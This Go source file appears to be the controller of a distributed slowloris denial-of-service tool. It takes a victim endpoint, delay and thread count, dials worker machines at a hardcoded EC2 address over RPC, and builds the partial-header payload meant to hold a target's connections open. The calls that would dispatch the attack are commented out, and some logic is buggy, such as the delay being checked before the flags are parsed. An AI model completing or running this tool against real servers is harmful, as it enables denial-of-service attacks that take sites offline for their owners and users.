package main

import (
  "flag"
  "net/rpc"
  "DistributedSlowLoris/shared"
  "fmt"
)

const (
  EC2 = "18.219.140.44:" // EC2 public connection IP (TODO provision more instances)
  port = "3000" // port that worker(s) listen on
  SETSTATE = "Worker.SetState"
  SETHEADERS = "Worker.SetHeaders"
  ATTACK = "Worker.Attack"
)

/*
type WorkerInfo struct {
        conn      *rpc.Client
        addr      workerAddress
}*/

type BroadCaster struct {
        clients   []*rpc.Client
        workers   []string
}

func main() {
  endpoint := flag.String("endpoint", "", "endpoint which will be victim of slowloris attack")
  delay := flag.Int("delay", 10, "time to wait between writes to specified endpoint")
  // set delay to be at least 5 seconds
  if *delay < 5 {
    *delay = 5
  }
  numAttackers := flag.Int("threads", 10, "number of threads to be dispatched to execute attacks")
  timeout := flag.Int("timeout", 0, "optional timeout (if you want attack to eventually terminate)")
  flag.Parse()

  // exit if no endpoint provided
  if *endpoint == "" {
    fmt.Println("usage: broadcaster -endpoint <url> ...")
    return
  }

  broadcaster := &BroadCaster{clients: make([]*rpc.Client, 1), workers: make([]string, 1)}

  // add single EC2 to list of workers, planning for  eventually managing multiple workers
  broadcaster.workers = append(broadcaster.workers, EC2)

  // establish RPC clients for each worker
  for _, address := range broadcaster.workers {
    conn, err := rpc.Dial("tcp", address + port)
    if err != nil {
      fmt.Println("failed to connect to worker at  address:", address)
      continue
    }
    // add RPC client for host to list of clients
    broadcaster.clients = append(broadcaster.clients, conn)
  }

  // store important state to be sent to worker
  workerState := &shared.State {
    Endpoint:     *endpoint,
    Delay:        *delay,
    NumAttackers: *numAttackers,
    Timeout:      *timeout,
  }

  // set headers used for slow loris attack
  workerHeaders := &shared.Headers{
    Base: []byte("GET / HTTP/1.0\r\n"),
    //General: []byte("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0 Accept-language: en-US,en,q=0.5"),
    Loris: []byte("X-a 1\r\n"),
  }

  // store status codes for setting worker state (only necessary to uphold RPC convention)
  var setStateRes, setHeadersRes int

  fmt.Println(workerState, workerHeaders, setStateRes, setHeadersRes)

  // use RPC to set important headers/state for all workers, and execute attacks
  /*for _, conn := range broadcaster.clients {
    if err := conn.Call(SETHEADERS, workerHeaders, &setHeadersRes); err != nil {
      fmt.Println("Error setting headers for worker")
    } else {
      fmt.Println("SET HEADERS")
    }
    if err := conn.Call(SETSTATE, workerState, &setStateRes); err != nil {
      fmt.Println("Error setting headers for worker")
    } else {
      fmt.Println("SET STATE")
    }
  }*/
  fmt.Println("lets see if its there", broadcaster.clients[0] == nil)

  // using dummy loop to keep broadcaster from termianting (HACKY)
  for {
  }

}
